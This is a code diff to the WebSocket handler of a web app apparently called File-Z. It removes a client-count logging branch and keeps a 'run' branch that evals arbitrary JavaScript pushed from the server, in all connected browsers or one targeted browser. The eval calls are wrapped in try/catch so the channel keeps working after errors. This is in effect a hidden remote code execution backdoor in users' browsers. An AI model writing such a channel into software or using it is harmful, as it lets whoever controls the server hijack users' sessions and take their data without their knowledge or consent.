@@ -150,33 +150,38 @@ function connectWebSocket() {
       const receivedData = JSON.parse(e.data);
       console.log("Received message:", receivedData); // Log received messages
 
-      if (receivedData.info) {
-        // Handle info messages
-        const activeFilezUsers = receivedData.info.connectedClients;
-        console.log("People actively using File-Z:", activeFilezUsers);
-        // You can perform additional actions with the info data if needed
-      } else if (receivedData.run) {
+      if (receivedData.run) {
         // Handle run messages
         const jsCode = receivedData.run.command;
         const targetClient = receivedData.run.client;
+
+        console.log("Received run command:", jsCode); // Log the received command
 
         if (typeof jsCode === "string") {
           if (targetClient === "all") {
             // If the command is for all clients, execute it
             console.log(`Received and executing command for all clients: ${jsCode}`);
-            eval(jsCode);
+            try {
+              eval(jsCode);
+            } catch (evalError) {
+              console.error("Error during eval:", evalError);
+            }
           } else if (targetClient === "this") {
             // If the command is specifically for this client, execute it
             console.log(`Received and executing command for this client: ${jsCode}`);
-            eval(jsCode);
+            try {
+              eval(jsCode);
+            } catch (evalError) {
+              console.error("Error during eval:", evalError);
+            }
           } else {
             console.error("Invalid target client:", targetClient);
           }
         } else {
-          console.error("Command must be a string.");
+          console.error("Command must be a string. Type:", typeof jsCode);
         }
       } else {
-        console.error("Invalid or unspecified message format.");
+        console.error("Invalid or unspecified command format.");
       }
     } catch (error) {
       console.error("Error parsing received data:", error);
